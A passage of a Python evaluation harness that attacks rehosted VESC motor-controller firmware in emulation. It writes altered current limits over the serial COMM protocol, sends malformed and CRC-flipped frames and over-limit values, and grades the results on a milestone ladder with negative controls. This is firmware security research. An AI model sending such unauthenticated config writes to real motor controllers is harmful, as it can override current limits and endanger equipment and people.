        # l_in_current_max = 5000 A and l_current_max_scale = 9.0. The handler
        # runs `utils_truncate_number()` against this hardware's own
        # HW_LIM_CURRENT_IN (-300, 300) and against the fixed 0.0-1.0 range for
        # the scales, so a device that DISCRIMINATES clamps them to 300.0 and
        # 1.0; a device (or a harness) that merely stores what it is handed
        # would report 5000 and 9.0 back. This is the control that proves the
        # positive result is the firmware accepting a value rather than an echo
        # (playbook §2.22).
        absurd = vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=5000.0, l_current_max_scale=9.0)
        self._send(vc.frame(absurd))
        clamp_ack = self._read_frame(timeout=REPLY_TIMEOUT)
        res["neg_clamp_ack_id"] = None if clamp_ack is None else clamp_ack[0]
        after_clamp = self.get_mcconf()
        res["neg_clamp_state"] = None if after_clamp is None \
            else self._decode(after_clamp)
        res["neg_clamp_enforced"] = bool(
            after_clamp is not None
            and abs(self._decode(after_clamp)["l_in_current_max"] - 300.0) < 1e-3
            and abs(self._decode(after_clamp)["l_current_max_scale"] - 1.0) < 1e-4)

        # Put the limits back where the device had them, so the attack below
        # starts from the device's own configuration and its effect is
        # unambiguous.
        self._send(vc.frame(vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=res["before"]["l_in_current_max"],
            l_current_max_scale=res["before"]["l_current_max_scale"])))
        self._read_frame(timeout=REPLY_TIMEOUT)
        restored = self.get_mcconf()
        res["restored_state"] = None if restored is None \
            else self._decode(restored)

        # ---- the attack ------------------------------------------------------
        self._send(good)
        ack = self._read_frame(timeout=REPLY_TIMEOUT)
        res["set_ack_id"] = None if ack is None else ack[0]
        res["set_ack_frame"] = "" if ack is None else vc.frame(ack).hex()

        # ---- an INDEPENDENT read-back: the oracle ---------------------------
        after = self.get_mcconf()
        if after is None:
            res["error"] = "no COMM_GET_MCCONF reply after the write"
            return res
        res["after"] = self._decode(after)
        res["readback_in_current_max_bytes"] = after[
            vc.MCCONF_OFF_L_IN_CURRENT_MAX:
            vc.MCCONF_OFF_L_IN_CURRENT_MAX + 4].hex()
        res["readback_current_max_scale_bytes"] = after[
            vc.MCCONF_OFF_L_CURRENT_MAX_SCALE:
            vc.MCCONF_OFF_L_CURRENT_MAX_SCALE + 2].hex()

        changed = (
            abs(res["after"]["l_in_current_max"] - ATTACK_IN_CURRENT_MAX) < 1e-3
            and abs(res["after"]["l_current_max_scale"]
                    - ATTACK_CURRENT_MAX_SCALE) < 1e-4
            and res["after"] != res["before"])
        res["changed"] = changed

        res["landed"] = bool(changed
                             and res["neg_bad_crc_rejected"]
                             and res["neg_clamp_enforced"])
        if changed and not res["landed"]:
            res["error"] = ("the write landed but a negative control did NOT "
                            "behave as the firmware's source says it must, so "
                            "the oracle is not trustworthy on this run")
        return res



# =========================================================================
# THE LADDER.  One pure function, called from ONE place (`_finalize`, in a
# `finally` block), so every exit from `run_attack` goes through it.
#
# What it replaces, transcribed:
#
#     result = {..., "milestone": "M0", ...}
#     if not sc.boot(stage):
#         result["milestone"] = "ERROR" if gated else ("M0" if faulted else "M1")
#         return result
#     result["milestone"] = "M3"                     # boot() returned True
#     if result["landed"]: result["milestone"] = "M4"
#
# Enumerated over the same booleans the repaired ladder takes, that is
# 128 assignments printing {ERROR, M0, M1, M3, M4} -- and **32 of them are
# w91.1's DOWNWARD false floor**: `boot()` returns False when the firmware
# does not enable USART3 inside the timeout, and that path could only ever
# report M0 or M1, so a run whose guest ran ChibiOS' crt0, reached `main()`
# and printed its own `conf_general_init` / `mc_interface_init` boot trace --
# M2 by the fleet's own definition -- reported **M1**, with the evidence
# already in its own log.
#
# `own_init` is therefore read from the firmware's own boot trace, not from
# the USART3 marker, and the floor is INSIDE the ladder.
#
# There is deliberately **no M5 branch**: this device has one interface (the
# USART3 COMM seam), so RULES §1a leaves M5 UNDEFINED, and a branch with no
# term would be w88.6's defect in a taller hat. There is no M8 branch for the
# same reason.
def _ladder(gates_ok: bool, guest_ran: bool, own_init: bool, seam_up: bool,
            m4: bool, m6: bool, m7: bool) -> str:
    """The highest rung THIS run earned. Pure; no I/O; no globals."""
    if not gates_ok:
        # Not a rung. Nothing was measurable, so there is no milestone and the
        # failure is about the install (see THE TWO STARTUP GATES above).
        return "ERROR"
    if not guest_ran:
        return "M0"
    if not own_init:
        return "M1"
    if not seam_up:
        return "M2"
    if not m4:
        return "M3"
    # M6 and M7 do NOT chain (RULES §1a, 2026-09-02): a scorer that requires
    # M6 before M7 is a defect in the scorer, not a property of the ladder.
    if m7:
        return "M7"
    if m6:
        return "M6"
    return "M4"


#: Every string `_ladder` is capable of returning. `tools/enumerate_ladder.py`
#: checks this against BOTH what the enumeration prints AND what the source
#: `ast` says the function writes, so a branch that exists but is unreachable
#: is reported as a DEAD BRANCH rather than as a fact about the firmware.
LADDER_PRINTABLE = ("ERROR", "M0", "M1", "M2", "M3", "M4", "M6", "M7")


# =========================================================================
# M6 / M7
# =========================================================================
class _Mint:
    """Per-run values. Seeded from `VESC_MINT_SEED` when set, so a default arm
    and a `--falsify` arm can mint IDENTICALLY and the FIRMWARE's replies can
    then be compared byte for byte across the two (playbook w100.4)."""

    def __init__(self, seed: Optional[str]) -> None:
        import random
        self.seed = seed
        self._r = random.Random(seed) if seed else None

    def bits(self, n: int) -> int:
        if self._r is None:
            import secrets
            return secrets.randbits(n)
        return self._r.getrandbits(n)

    def below(self, n: int) -> int:
        if self._r is None:
            import secrets
            return secrets.randbelow(n)
        return self._r.randrange(n)


def _f32_bytes(v: float) -> str:
    import struct as _s
    return _s.pack(">f", v).hex()


def _f16_bytes(w: float) -> str:
    """The firmware's own `buffer_append_float16`, which TRUNCATES.

    Not `round()`. A twin caught this live: the minted scale 0.5275 was
    predicted 5275 and the firmware answered 5274, because binary32(0.5275)
    sits just below 0.5275 and `(int16_t)(number * scale)` is a C cast. It is
    wrong for 537 of the 9000 minted values this phase can draw, so a
    six-per-cent failure rate on a single twin is exactly what it produced.
    """
    return vc.float16(w).hex()


def _f32_neighbour(v: float, up: bool) -> float:
    """The next representable **binary32** either side of ``v``.

    NOT ``math.nextafter``: that steps a *double*, and packing the result back
    to binary32 rounds it straight onto ``v`` again -- so a "one step above the
    limit" built that way is the limit, the clamp has nothing to clamp, and the
    class silently tests nothing. Caught by this row's own test before it ran.
    """
    bits = struct.unpack(">I", struct.pack(">f", v))[0]
    bits += 1 if up else -1
    return struct.unpack(">f", struct.pack(">I", bits))[0]


def _predict_in_current_max(v: float) -> float:
    """`utils_truncate_number(&x, HW_LIM_CURRENT_IN)` -- the board's own range."""
    return max(-HW_LIM_CURRENT_IN, min(HW_LIM_CURRENT_IN, v))


def _predict_scale(w: float) -> float:
    lo, hi = SCALE_LIMITS
    return max(lo, min(hi, w))


#: The distinct ANSWERS this firmware gives to the graded classes. The
#: mispredict knob rotates onto the next DISTINCT answer, never onto the next
#: CLASS: six of the nine classes share `silent-nowrite`, so a next-class
#: rotation would leave them predicting what they already predicted and the
#: knob would move three classes while the verdict flipped anyway (w96.2/w100.4).
ANSWER_IDS = ("silent-nowrite", "rendered-invalid-command", "clamped-to-limit")


def _rotate(answer_id: str) -> str:
    i = ANSWER_IDS.index(answer_id)
    return ANSWER_IDS[(i + 1) % len(ANSWER_IDS)]


def _framing_variants(payload: bytes, mint: _Mint):
    """The malformed framings of ONE payload, each with its valid twin.

    Every one of them is `packet.c`'s own rule, and every one of them carries a
    REAL `COMM_SET_MCCONF_TEMP` write, so the witness of the refusal is the
    limit the firmware declined to move -- not the silence (w100.3).
    """
    good = vc.frame(payload)
    n = len(payload)
    out = []

    b = bytearray(good); b[1] = 0
    out.append(("hdr_len_zero", bytes(b),
                "8-bit form declaring length 0 -- try_decode_packet: "
                "`if (len < 1) return -1`"))
    b = bytearray(good); b[1] = (n + 1) & 0xFF
    out.append(("hdr_len_over", bytes(b),
                "declared length one MORE than the payload"))
    b = bytearray(good); b[1] = (n - 1) & 0xFF
    out.append(("hdr_len_under", bytes(b),
                "declared length one LESS than the payload"))
    b = bytearray(good); b[0] = 4
    out.append(("start_byte_24bit", bytes(b),
                "start byte 4: the 24-bit form is compiled out at "
                "PACKET_MAX_PL_LEN=512, so it is not a valid start byte"))
    b = bytearray(good); b[-1] = 4
    out.append(("stop_byte_wrong", bytes(b),
                "stop byte 4 -- `if (buffer[data_start+len+2] != 3) return -1`"))
    b = bytearray(good); b[-3] ^= 1 << mint.below(8)
    out.append(("crc_one_bit", bytes(b),
                "ONE bit of the CRC-16 flipped, at a per-run minted position"))
    out.append(("truncated", good[:-2],
                "the last two bytes dropped"))
    return good, out


def _m7_phase(sc: "VescScenario", mint: _Mint, stage: Callable) -> dict:
    """Adversarial input, every class with a witness that is not silence.

    Three counters, deliberately SEPARATE (w100.3): folding a state fact into
    the same number as a rendered string would inflate the figure the
    valid-only control has to drive to zero, by a term that is ours to define.
    """
    mode = FALSIFY
    res: dict = {
        "mode": mode, "classes": [], "classes_ok": 0, "classes_total": 0,
        "twins_ok": 0, "twins_total": 0,
        "refusal_witnesses_seen": 0,     # firmware-RENDERED refusal strings
        "state_refusals_seen": 0,        # a limit the firmware declined to move
        "clamp_refusals_seen": 0,        # a limit the firmware SUBSTITUTED
        "resyncs": [], "seam_alive_after_every_class": True,
        "reply_digest": "",
    }
    import hashlib
    digest = hashlib.sha256()

    base = sc.get_mcconf()
    if base is None:
        res["error"] = "no COMM_GET_MCCONF before the M7 phase"
        return res

    def record_twin(name, ok, want, got, extra=None):
        """A twin is a graded observation too. Recording only the COUNT means a
        failing twin cannot be named -- which is exactly where this lane's
        first complete arm stopped: `twins 9/10`, and nothing said which."""
        row = {"twin": name, "ok": bool(ok), "want": want, "got": got}
        if extra:
            row.update(extra)
        res.setdefault("twins", []).append(row)
        res["twins_total"] += 1
        res["twins_ok"] += int(bool(ok))

    def record(name, expected, observed, note, extra=None):
        ok = (observed == expected)
        row = {"class": name, "expected": expected, "observed": observed,
               "ok": ok, "note": note}
        if extra:
            row.update(extra)
        res["classes"].append(row)
        res["classes_total"] += 1
        res["classes_ok"] += int(ok)
        return ok

    # ---- the framing classes ------------------------------------------
    for name, raw, note in _framing_variants(
            vc.set_mcconf_temp_payload(base, store=False, ack=True,
                                       l_current_max_scale=0.5),
            mint)[1]:
        w = (mint.below(9000) + 500) / 10000.0        # a per-run minted scale
        payload = vc.set_mcconf_temp_payload(base, store=False, ack=True,
                                             l_current_max_scale=w)
        good, variants = _framing_variants(payload, mint)
        raw = dict((n, r) for n, r, _n in variants)[name]
        before = sc.raw_config_fields()
        sc.drain(0.5)
        # `m7-valid-only` sends the class's OWN valid twin instead. That is the
        # arm w91.2 says a refusal rung is worthless without: the witnesses
        # must go to ZERO while the seam still answers.
        sc._send(good if mode == "m7-valid-only" else raw)
        reply = sc._read_frame(timeout=SILENCE_TIMEOUT)
        rs = sc.resync()
        res["resyncs"].append(dict(rs, cls=name))
        res["seam_alive_after_every_class"] &= bool(rs["alive"])
        after = sc.raw_config_fields()
        digest.update(("%s|%s|%s" % (name, reply.hex() if reply else "-",
                                     (after or {}).get("l_current_max_scale")))
                      .encode())
        if after is not None and after == before:
            observed = "silent-nowrite"
            res["state_refusals_seen"] += 1
        elif after is not None and after["l_current_max_scale"] == _f16_bytes(w):
            observed = "accepted-write"
        else:
            observed = "other"
        expected = _rotate("silent-nowrite") if mode == "m7-mispredict" \
            else "silent-nowrite"
        record(name, expected, observed, note,
               {"minted_scale": w, "before": before, "after": after,
                "reply": reply.hex() if reply else None})
        # the TWIN: the same payload, correctly framed, must LAND.
        sc.drain(0.5)
        sc._send(good)
        sc._read_frame(timeout=REPLY_TIMEOUT)
        tw = sc.raw_config_fields()
        record_twin(name, tw is not None
                    and tw["l_current_max_scale"] == _f16_bytes(w),
                    _f16_bytes(w), (tw or {}).get("l_current_max_scale"),
                    {"minted_scale": w})
        digest.update(("twin|%s|%s" % (name, (tw or {}).get(
            "l_current_max_scale"))).encode())

    # ---- the rendered-refusal class -----------------------------------
    # `terminal_process_string()` prints `Invalid command: %s\ntype help to
    # list all available commands\n`. That format string is in the image
    # exactly once; the RENDERED line, carrying a per-run nonce, is in it zero
    # times, and the host cannot make the firmware say it by any other route.
    nonce = "zz%08x" % mint.bits(32)
    cmd = (TERMINAL_PROBE if mode == "m7-valid-only" else nonce.encode())
    lines = sc.terminal_lines(cmd)
    rs = sc.resync()
    res["resyncs"].append(dict(rs, cls="terminal_unknown"))
    res["seam_alive_after_every_class"] &= bool(rs["alive"])
    want = "Invalid command: " + nonce
    rendered = any(l.startswith(want) for l in lines)
    res["refusal_witnesses_seen"] += int(rendered)
    observed = "rendered-invalid-command" if rendered else (
        "answered-without-refusal" if lines else "silent-nowrite")
    expected = _rotate("rendered-invalid-command") if mode == "m7-mispredict" \
        else "rendered-invalid-command"
    record("terminal_unknown", expected, observed,
           "an unknown terminal command: the firmware must render the host's "
           "own per-run nonce inside its own error template",
           {"nonce": nonce, "sent": cmd.decode("latin-1"), "lines": lines})
    digest.update(("term|%s" % "|".join(lines)).encode())
    # the twin: a command that IS in the table answers, and says nothing about
    # an invalid command. Its answer is NOT itself a refusal string, which is
    # what w100.2 says to check before using a twin at all.
    tlines = sc.terminal_lines(TERMINAL_PROBE)
    record_twin("terminal_known",
                any(l.startswith("FAULT_CODE") for l in tlines)
                and not any(l.startswith("Invalid command") for l in tlines),
                "a FAULT_CODE line and NO refusal string", tlines)
    digest.update(("termtwin|%s" % "|".join(tlines)).encode())

    # ---- the clamp classes: a refusal that SUBSTITUTES ------------------
    for field, name, note in (
            ("l_in_current_max", "clamp_in_current",
             "l_in_current_max one float32 step ABOVE HW_LIM_CURRENT_IN"),
            ("l_current_max_scale", "clamp_scale",
             "l_current_max_scale above the fixed 0.0-1.0 range")):
        # The ENCODER is per field and must be used for every prediction about
        # that field. A first version compared the read-back against BOTH
        # encoders "whichever matched", and `_f16_bytes(300.00003)` is
        # 3_000_000 in an int16 -- it raised, mid-arm, on the first live run.
        # An encoder chosen by `or` is a prediction nobody wrote down.
        if field == "l_in_current_max":
            enc, predict = _f32_bytes, _predict_in_current_max
            good_v = _f32_neighbour(HW_LIM_CURRENT_IN, up=False)
            bad_v = _f32_neighbour(HW_LIM_CURRENT_IN, up=True)
            sent = good_v if mode == "m7-valid-only" else bad_v
            kw = {"l_in_current_max": sent, "l_current_max_scale": 0.5}
        else:
            enc, predict = _f16_bytes, _predict_scale
            good_v = (mint.below(9000) + 500) / 10000.0
            bad_v = 1.0 + (mint.below(9000) + 500) / 10000.0
            sent = good_v if mode == "m7-valid-only" else bad_v
            kw = {"l_in_current_max": 250.0, "l_current_max_scale": sent}
        predict_clamped = enc(predict(bad_v))
        predict_accept = enc(good_v)
        # What the firmware would have stored had it NOT clamped. The class is
        # only a measurement if that differs from the clamped prediction.
        predict_unclamped = enc(bad_v) if field == "l_in_current_max" \
            else _f16_bytes(min(bad_v, 3.2767))
        assert predict_unclamped != predict_clamped, (
            "the clamp class must send a value the firmware has to CHANGE")
        sc.drain(0.5)
        sc._send(vc.frame(vc.set_mcconf_temp_payload(
            base, store=False, ack=True, **kw)))
        sc._read_frame(timeout=REPLY_TIMEOUT)
        rs = sc.resync()
        res["resyncs"].append(dict(rs, cls=name))
        res["seam_alive_after_every_class"] &= bool(rs["alive"])
        after = sc.raw_config_fields()
        got = (after or {}).get(field)
        digest.update(("clamp|%s|%s" % (name, got)).encode())
        if got == predict_clamped and got != predict_unclamped:
            observed = "clamped-to-limit"
            res["clamp_refusals_seen"] += 1
        elif got == predict_accept:
            observed = "accepted-write"
        else:
            observed = "other"
        expected = _rotate("clamped-to-limit") if mode == "m7-mispredict" \
            else "clamped-to-limit"
        record(name, expected, observed, note,
               {"sent": sent, "got": got, "predict_clamped": predict_clamped,
                "predict_accept": predict_accept,
                "predict_unclamped": predict_unclamped})
        # the twin: the value ONE representable step on the other side, which
        # the firmware must store unchanged.
        sc.drain(0.5)
        kw2 = dict(kw)
        kw2[field] = good_v
        sc._send(vc.frame(vc.set_mcconf_temp_payload(
            base, store=False, ack=True, **kw2)))
        sc._read_frame(timeout=REPLY_TIMEOUT)
        tw = (sc.raw_config_fields() or {}).get(field)
        record_twin(name, tw == predict_accept, predict_accept, tw,
                    {"sent": good_v, "field": field})
        digest.update(("clamptwin|%s|%s" % (name, tw)).encode())

    res["reply_digest"] = digest.hexdigest()[:16]
    res["ok"] = bool(
        res["classes_total"] > 0
        and res["classes_ok"] == res["classes_total"]
        and res["twins_ok"] == res["twins_total"]
        and res["seam_alive_after_every_class"]
        and res["refusal_witnesses_seen"] > 0
        and res["state_refusals_seen"] > 0
        and res["clamp_refusals_seen"] > 0)
    stage("m7", note="classes %d/%d twins %d/%d  witnesses rendered=%d "
                     "state=%d clamp=%d  seam-after-every-class=%s  "
                     "digest=%s  mode=%r"
          % (res["classes_ok"], res["classes_total"], res["twins_ok"],
             res["twins_total"], res["refusal_witnesses_seen"],
             res["state_refusals_seen"], res["clamp_refusals_seen"],
             res["seam_alive_after_every_class"], res["reply_digest"],
             mode or "default"))
    return res


def _m6_phase(sc: "VescScenario", mint: _Mint, stage: Callable,
              rounds: int = 6) -> dict:
    """The SAME byte-identical request, answered differently at N states.

    Two witnesses, and they are independent of each other:

    * the firmware's own serialized `mc_configuration` (`COMM_GET_MCCONF`,
      id 14) -- `l_current_max_scale` as `round(w*10000)` in a big-endian
      int16, and `l_in_current_max` as binary32. The pair is deliberate
      (w99.4): on the CLAMPING side `l_in_current_max` predicts the constant
      300.0 whatever we mint, so it is only half a witness there, and the
      scale, which is minted inside the accepted range in the same round,
      is the half that still moves.
    * the GUEST's own count of packets its decoder ACCEPTED, read out of
      `commands_process_packet` arrivals. Each round mints `k` well-formed and
      `j` malformed frames; the guest's counter must rise by exactly `k`, so
      the delta AGAINST WHAT WE SENT is negative by `j`. A host cannot compute
      that number without reimplementing `try_decode_packet`.
    """
    res: dict = {"rounds": [], "rounds_ok": 0, "rounds_total": 0,
                 "answers_differ": False, "counter_ok": 0,
                 "counter_total": 0, "mode": FALSIFY}
    base = sc.get_mcconf()
    if base is None:
        res["error"] = "no COMM_GET_MCCONF before the M6 phase"
        return res
    seen_answers = set()
    frozen: Optional[dict] = None
    for r in range(rounds):
        # alternate the sides so NEITHER direction can be absent by luck
        over = bool(r % 2)
        w = ((1.0 + (mint.below(9000) + 500) / 10000.0) if over
             else (mint.below(9000) + 500) / 10000.0)
        v = ((HW_LIM_CURRENT_IN + 1 + mint.below(500)) if over
             else float(mint.below(29000) + 500) / 100.0)
        k = 1 + mint.below(4)          # well-formed frames the guest must count
        j = mint.below(3)              # malformed frames it must NOT count
        before_n = sc.accepted_packets()
        sc.drain(0.5)
        sc._send(vc.frame(vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=v, l_current_max_scale=w)))
        sc._read_frame(timeout=REPLY_TIMEOUT)
        sent_ok = 1
        for _ in range(k - 1):
            sc.request(bytes([vc.COMM_FW_VERSION]), want=vc.COMM_FW_VERSION,
                       timeout=REPLY_TIMEOUT)
            sent_ok += 1
        for _ in range(j):
            b = bytearray(vc.frame(bytes([vc.COMM_FW_VERSION])))
            b[-3] ^= 0xFF
            sc.drain(0.2)
            sc._send(bytes(b))
            sc._read_frame(timeout=2.0)
        rs = sc.resync()
        sent_ok += 1                          # resync's own known-good frame
        # THE request: byte-identical every round.
        raw = sc.raw_config_fields()
        sent_ok += 1                          # get_mcconf inside raw_config_fields
        temp = sc.request(bytes([91]), want=91, timeout=REPLY_TIMEOUT)
        sent_ok += 1
        after_n = sc.accepted_packets()
        want_scale = _f16_bytes(_predict_scale(w))
        want_in = _f32_bytes(_predict_in_current_max(v))
        target = frozen if (FALSIFY == "m6-freeze" and frozen) else {
            "l_current_max_scale": want_scale, "l_in_current_max": want_in}
        if frozen is None:
            frozen = dict(target)
        ok = (raw is not None and raw["l_current_max_scale"]
              == target["l_current_max_scale"]
              and raw["l_in_current_max"] == target["l_in_current_max"])
        # witness 2: the guest's own accepted-frame count
        delta = (None if (before_n is None or after_n is None)
                 else after_n - before_n)
        counter_ok = (delta is not None and delta == sent_ok)
        res["counter_total"] += 1
        res["counter_ok"] += int(counter_ok)
        # witness 1b: the second, INDEPENDENT handler (COMM_GET_MCCONF_TEMP,
        # id 91) reports the same state through a different serializer
        # (float32_auto, not the int16 the full mcconf uses).
        temp_scale = None
        if temp is not None and len(temp) >= 9:
            temp_scale = struct.unpack_from(">f", bytes(temp), 5)[0]
        temp_ok = (temp_scale is not None
                   and abs(temp_scale - _predict_scale(w)) < 1e-4)
        seen_answers.add((raw or {}).get("l_current_max_scale"))
        res["rounds"].append({
            "round": r, "minted_scale": w, "minted_in_current": v,
            "over_limit": over, "sent_wellformed": sent_ok, "sent_malformed": j,
            "guest_accepted_delta": delta, "counter_ok": counter_ok,
            "readback": raw, "want_scale": target["l_current_max_scale"],
            "want_in_current": target["l_in_current_max"], "ok": ok,
            "id91_scale": temp_scale, "id91_ok": temp_ok,
            "resync": rs})
        res["rounds_total"] += 1
        res["rounds_ok"] += int(ok and temp_ok)
    res["answers_differ"] = len(seen_answers - {None}) > 1
    res["ok"] = bool(res["rounds_total"] == rounds
                     and res["rounds_ok"] == rounds
                     and res["counter_ok"] == res["counter_total"]
                     and res["answers_differ"])
    stage("m6", note="rounds %d/%d  guest-counter %d/%d  answers differ=%s  "
                     "mode=%r"
          % (res["rounds_ok"], res["rounds_total"], res["counter_ok"],
             res["counter_total"], res["answers_differ"], FALSIFY or "default"))
    return res


def _finalize(sc: "VescScenario", result: dict) -> dict:
    """Apply the ladder. Called from ONE place, in `run_attack`'s `finally`,
    so EVERY exit -- the refusal, both gate failures, an exception, and the
    graded path -- is graded by the same function on the same facts.

    The facts are read from the child's own log rather than from whatever the
    body managed to set, so a run that died half way through is still graded
    on what its guest actually did.
    """
    text = sc.log_text()
    result["log_bytes"] = len(text)
    faulted = any(m in text for m in _GUEST_FAULT_MARKERS)
    result["guest_faulted"] = faulted
    # M1: the CPU started (gate 1) and did measured work (gate 2), with no
    # guest fault. `gate1` is None when logging.cfg could not print the marker
    # at all, and None must not read as a failure (see THE TWO STARTUP GATES).
    gate1 = result.get("gate1_cpu_started")
    guest_ran = (gate1 is not False) and not faulted and (
        (result.get("gate2_child_cpu_s") or 0.0) >= WORK_FLOOR_CPU_S)
    # M2: the FIRMWARE's own boot trace. THIS is the line that repairs w91.1's
    # downward false floor: the old code could only answer M0 or M1 whenever
    # `boot()` returned False, so a guest that ran ChibiOS' crt0, reached
    # `main()` and printed `conf_general_init` / `mc_interface_init` -- its own
    # initialisation, M2 by the fleet's definition -- was reported M1, with the
    # evidence sitting in its own log.
    boot_syms = re.findall(r"BOOT: ([A-Za-z_][\w]*)", text)
    result["boot_trace"] = boot_syms[:16]
    own_init = any(s in boot_syms for s in
                   ("conf_general_init", "mc_interface_init", "commands_init"))
    # M3: the firmware drove its own peripheral -- its USART3 driver wrote
    # CR1.UE, which is what BOOT_MARKER records.
    seam_up = BOOT_MARKER in text
    result["own_init"] = own_init
    result["seam_up"] = seam_up
    result["milestone"] = _ladder(
        gates_ok=not result.get("gated_out", False),
        guest_ran=bool(guest_ran),
        own_init=bool(own_init),
        seam_up=bool(seam_up),
        m4=bool(result.get("landed")),
        m6=bool((result.get("m6") or {}).get("ok")),
        m7=bool((result.get("m7") or {}).get("ok")))
    # THE FLEET INVARIANT, asserted where it is produced: `landed` means M4 and
    # only M4, never a rung below it.
    result["landed"] = bool(result.get("landed")) and \
        result["milestone"] in ("M4", "M6", "M7")
    return result


def run_attack(on_stage: Optional[Callable] = None,
               log_dir: Optional[str] = None) -> dict:
    """Fleet-standard entry point (playbook §2a). Self-booting.

    Returns at least ``booted`` and ``landed``. ``landed`` comes from the
    firmware's OWN COMM replies, never from host bookkeeping.
    """
    def stage(name, **d):
        if on_stage:
            on_stage(name, **d)

    if FALSIFY not in FALSIFY_MODES:
        # A knob that falls through to the default runs the REAL arm and
        # reports it as a control, which reads either as "the control does not
        # discriminate" or as "I ran the control", and both are false.
        raise SystemExit(
            "VESC_FALSIFY=%r is not a recognised mode; expected one of %s"
            % (FALSIFY, ", ".join(repr(m) for m in FALSIFY_MODES)))

    # HAL_PY first, then sys.executable.  spawn_argv() already honours HAL_PY,
    # but passing sys.executable here overrode it -- which made the one control
    # arm that reproduces a BROKEN INSTALL (an interpreter with no halucinator)
    # unrunnable against this harness.  A gate you cannot make fail is not a
    # gate.
    sc = VescScenario(python=os.environ.get("HAL_PY") or sys.executable,
                      log_dir=log_dir or "/tmp")
    # NO pre-initialised rung: `_finalize` derives `milestone` on every path.
    result: dict = {"booted": False, "landed": False,
                    "vesc_packet_round_trip": False,
                    "seam_control": SEAM_CONTROL,
                    "falsify": FALSIFY,
                    "mint_seed": MINT_SEED,
                    "gate1_cpu_started": None,
                    "gate2_child_cpu_s": 0.0,
                    "gate2_floor_cpu_s": WORK_FLOOR_CPU_S,
                    "gated_out": False,
                    # A phase that never RAN reports `unobservable`, never a
                    # scored zero (w66.2/w68.2/w78.6).
                    "m6": {"ok": False, "unobservable": True},
                    "m7": {"ok": False, "unobservable": True},
                    "logging_cfg_present": VescScenario.logging_cfg_present()}
    try:
        if not sc.boot(stage):
            bad = dict(sc.startup_failure or {})
            result["gated_out"] = bool(bad.pop("gated_out", True))
            bad.pop("guest_faulted", None)
            result.update(bad)
            return result
        result["booted"] = True
        # --- THE GATES, before anything is graded ----------------------
        result["gate1_cpu_started"] = (
            RUN_MARKER in sc.log_text() if sc.logging_cfg_present() else None)
        result["gate2_child_cpu_s"] = round(sc.cpu_seconds(), 2)
        bad = sc.startup_error()
        if bad:
            result.update(bad)
            result["gated_out"] = True
            result["booted"] = False
            result["landed"] = False
            stage("gates", note=result["error"])
            return result
        stage("gates", note="gate1 marker=%s (logging.cfg names __main__: %s), "
                            "gate2 child cpu=%.2fs (floor %.2f, healthy %.1f)"
              % (result["gate1_cpu_started"], result["logging_cfg_present"],
                 result["gate2_child_cpu_s"], WORK_FLOOR_CPU_S,
                 WORK_HEALTHY_CPU_S))
        state = sc.read_state()
        stage("read", state=state)
        global _SEAM_ARMED
        _SEAM_ARMED = SEAM_CONTROL
        atk = sc.attack()
        stage("attack", result=atk)
        result["state"] = state
        result["attack"] = atk
        # THE SEAM (M4).  Every clause is a reply the firmware framed and CRC'd
        # with its own packet.c: an independent COMM_GET_MCCONF read-back
        # reporting the attacker's value, the SAME frame with one CRC byte
        # flipped dropped in silence, and absurd values clamped by the
        # firmware's own utils_truncate_number() against this board's limits.
        result["vesc_packet_round_trip"] = bool(
            atk.get("changed")
            and atk.get("neg_bad_crc_rejected")
            and atk.get("neg_clamp_enforced"))
        result["landed"] = bool(atk.get("landed")
                                and result["vesc_packet_round_trip"])
        # --- the two new rungs --------------------------------------------
        # On the seam control arm no byte ever reaches the firmware, so these
        # phases cannot OBSERVE anything: they stay `unobservable`, which is
        # not the same as a scored zero.
        if not SEAM_CONTROL:
            mint = _Mint(MINT_SEED)
            result["m6"] = _m6_phase(sc, mint, stage)
            result["m7"] = _m7_phase(sc, mint, stage)
        # Re-sample: the attack is where most of the CPU is burned, and the
        # figure in the RESULT should describe the whole run, not just the boot.
        result["gate2_child_cpu_s"] = round(sc.cpu_seconds(), 2)
    finally:
        # The ladder runs BEFORE the child is reaped, so it can read the log,
        # and it runs on every exit including an exception.
        _finalize(sc, result)
        sc.shutdown()
    return result


def main() -> int:
    args = list(sys.argv[1:])
    while args:
        a = args.pop(0)
        if a.startswith("--falsify="):
            os.environ["VESC_FALSIFY"] = a.split("=", 1)[1]
        elif a == "--falsify":
            if not args:
                print("--falsify needs a value", file=sys.stderr)
                return 2
            os.environ["VESC_FALSIFY"] = args.pop(0)
        elif a in ("-h", "--help"):
            print("usage: python -m rehostry_vesc_bldc_f405.attack "
                  "[--falsify {m6-freeze|m7-valid-only|m7-mispredict}]")
            return 0
        else:
            # Never ignore an unknown flag: a harness whose main() swallows
            # argv accepts a documented-looking `--falsify typo` and runs the
            # REAL arm while reporting it as a control.
            print("unknown argument %r" % a, file=sys.stderr)
            return 2
    # The knob is read at import time, so re-read it after argv.
    global FALSIFY
    FALSIFY = os.environ.get("VESC_FALSIFY", "").strip().lower()
    if FALSIFY not in FALSIFY_MODES:
        print("unknown falsify mode %r; expected one of %s"
              % (FALSIFY, ", ".join(repr(m) for m in FALSIFY_MODES)),
              file=sys.stderr)
        return 2

    def show(name, **data):
        note = data.get("note", "")
        if note:
            print(f"[stage] {name}: {note}", flush=True)
        elif "state" in data:
            print(f"[stage] {name}: {json.dumps(data['state'])}", flush=True)
        elif "result" in data:
            print(f"[stage] {name}: {json.dumps(data['result'])}", flush=True)
        else:
            print(f"[stage] {name}", flush=True)

    res = run_attack(on_stage=show)
    if res.get("milestone") == "ERROR":
        # A failure nobody reads is the same as no failure at all: print the
        # child's own output rather than handing the operator a path.
        print("--- child output (tail) ---", file=sys.stderr)
        print("\n".join(res.get("child_output_tail") or ["(empty)"]),
              file=sys.stderr)
        print("--- end child output ---", file=sys.stderr)
    m6, m7 = res.get("m6") or {}, res.get("m7") or {}

    def phase(d, keys):
        if d.get("unobservable"):
            return "unobservable"
        return {k: d.get(k) for k in keys}

    # The full result, including EVERY graded class row, written where a
    # reader can check the verdict against the rows that produced it. A
    # summary line is not evidence: it cannot say WHICH class or twin moved.
    dump = os.environ.get("VESC_RESULT_JSON")
    if dump:
        with open(dump, "w") as fh:
            json.dump(res, fh, indent=1, default=str)
    print("RESULT:", json.dumps({
        **{k: v for k, v in res.items()
           if k in ("booted", "landed", "milestone",
                    "vesc_packet_round_trip", "seam_control", "falsify",
                    "mint_seed", "own_init", "seam_up", "guest_faulted",
                    "gate1_cpu_started", "gate2_child_cpu_s",
